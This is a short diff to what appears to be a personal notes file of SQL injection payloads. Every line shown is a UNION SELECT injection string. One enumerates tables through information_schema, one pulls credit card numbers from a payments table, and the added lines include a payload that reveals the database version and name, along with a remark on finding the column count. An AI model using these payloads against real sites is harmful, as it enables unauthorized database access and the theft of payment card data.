@@ -14,3 +14,7 @@ Audi' UNION SELECT 1,2,3,table_schema,table_name FROM information_schema.tables;
 
 
 category=1 UNION SELECT 1,creditcard_number,3 FROM payments
+
+category=1 UNION SELECT @@version,database(),3 FROM information_schema.tables
+finding sql version, also recognize how many allowable columns,
+in this case only 3
